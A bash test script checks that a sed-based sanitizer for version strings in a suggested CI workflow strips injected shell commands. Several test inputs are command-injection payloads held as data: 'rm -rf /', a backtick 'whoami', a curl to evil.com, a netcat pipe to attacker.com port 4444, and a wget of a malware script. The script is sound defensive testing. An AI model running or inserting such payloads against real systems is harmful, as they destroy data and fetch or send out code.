#!/bin/bash
# Security Fix Verification Test
# This script demonstrates that the sanitization prevents command injection

set -e

echo "=============================================="
echo "Security Fix Verification Test"
echo "Workflow: validate-requirements.yml.SUGGESTED"
echo "=============================================="
echo ""

# Test 1: Normal version string
echo "Test 1: Normal version string"
echo "------------------------------"
RAW_VERSION="3.1.0"
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
if [ "$CLEAN_VERSION" = "3.1.0" ]; then
  echo "✅ PASS: Normal version handled correctly"
else
  echo "❌ FAIL: Expected '3.1.0', got '$CLEAN_VERSION'"
  exit 1
fi
echo ""

# Test 2: Version with suffix (rc, beta, etc.)
echo "Test 2: Version with suffix"
echo "----------------------------"
RAW_VERSION="3.1.0rc1"
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
if [ "$CLEAN_VERSION" = "3.1.0" ]; then
  echo "✅ PASS: Version suffix stripped correctly"
else
  echo "❌ FAIL: Expected '3.1.0', got '$CLEAN_VERSION'"
  exit 1
fi
echo ""

# Test 3: Command injection via semicolon
echo "Test 3: Command injection attempt (semicolon)"
echo "----------------------------------------------"
RAW_VERSION="3.1.0; rm -rf /"
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
if [ "$CLEAN_VERSION" = "3.1.0" ]; then
  echo "✅ PASS: Command injection blocked"
else
  echo "❌ FAIL: Expected '3.1.0', got '$CLEAN_VERSION'"
  exit 1
fi
echo ""

# Test 4: Command injection via backticks
echo "Test 4: Command injection attempt (backticks)"
echo "----------------------------------------------"
RAW_VERSION='3.1.0`whoami`'
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
if [ "$CLEAN_VERSION" = "3.1.0" ]; then
  echo "✅ PASS: Command injection blocked"
else
  echo "❌ FAIL: Expected '3.1.0', got '$CLEAN_VERSION'"
  exit 1
fi
echo ""

# Test 5: Command injection via subshell
echo "Test 5: Command injection attempt (subshell)"
echo "---------------------------------------------"
RAW_VERSION='3.1.0$(curl http://evil.com)'
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
if [ "$CLEAN_VERSION" = "3.1.0" ]; then
  echo "✅ PASS: Command injection blocked"
else
  echo "❌ FAIL: Expected '3.1.0', got '$CLEAN_VERSION'"
  exit 1
fi
echo ""

# Test 6: Command injection via pipe
echo "Test 6: Command injection attempt (pipe)"
echo "-----------------------------------------"
RAW_VERSION="3.1.0 | nc attacker.com 4444"
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
if [ "$CLEAN_VERSION" = "3.1.0" ]; then
  echo "✅ PASS: Command injection blocked"
else
  echo "❌ FAIL: Expected '3.1.0', got '$CLEAN_VERSION'"
  exit 1
fi
echo ""

# Test 7: Command injection via ampersand (background process)
echo "Test 7: Command injection attempt (background)"
echo "-----------------------------------------------"
RAW_VERSION="3.1.0 & wget http://evil.com/malware.sh"
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
if [ "$CLEAN_VERSION" = "3.1.0" ]; then
  echo "✅ PASS: Command injection blocked"
else
  echo "❌ FAIL: Expected '3.1.0', got '$CLEAN_VERSION'"
  exit 1
fi
echo ""

# Test 8: Version parsing and comparison
echo "Test 8: Version comparison logic"
echo "---------------------------------"
RAW_VERSION="3.1.2"
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
MAJOR=$(printf '%s\n' "$CLEAN_VERSION" | cut -d'.' -f1)
MINOR=$(printf '%s\n' "$CLEAN_VERSION" | cut -d'.' -f2)
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
echo "Major:  '$MAJOR'"
echo "Minor:  '$MINOR'"
if [ "$MAJOR" = "3" ] && [ "$MINOR" = "1" ]; then
  echo "✅ PASS: Version parsing works correctly"
else
  echo "❌ FAIL: Expected major=3 minor=1, got major=$MAJOR minor=$MINOR"
  exit 1
fi
echo ""

# Test 9: Empty version string
echo "Test 9: Empty version string"
echo "----------------------------"
RAW_VERSION=""
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
if [ -z "$CLEAN_VERSION" ]; then
  echo "✅ PASS: Empty string handled correctly"
else
  echo "❌ FAIL: Expected empty string, got '$CLEAN_VERSION'"
  exit 1
fi
echo ""

# Test 10: Multiple dots in version
echo "Test 10: Multiple dots in version"
echo "----------------------------------"
RAW_VERSION="3.1.0.5"
CLEAN_VERSION=$(printf '%s\n' "$RAW_VERSION" | sed -E 's/[^0-9.].*$//')
echo "Input:  '$RAW_VERSION'"
echo "Output: '$CLEAN_VERSION'"
if [ "$CLEAN_VERSION" = "3.1.0.5" ]; then
  echo "✅ PASS: Multiple dots preserved (comparison uses first two)"
else
  echo "❌ FAIL: Expected '3.1.0.5', got '$CLEAN_VERSION'"
  exit 1
fi
echo ""

echo "=============================================="
echo "All Security Tests Passed! ✅"
echo "=============================================="
echo ""
echo "Summary:"
echo "--------"
echo "✅ Normal versions: Handled correctly"
echo "✅ Version suffixes: Stripped safely"
echo "✅ Semicolon injection: Blocked"
echo "✅ Backtick injection: Blocked"
echo "✅ Subshell injection: Blocked"
echo "✅ Pipe injection: Blocked"
echo "✅ Background process injection: Blocked"
echo "✅ Version parsing: Works correctly"
echo "✅ Edge cases: Handled properly"
echo ""
echo "The sanitization function is SECURE and FUNCTIONAL."
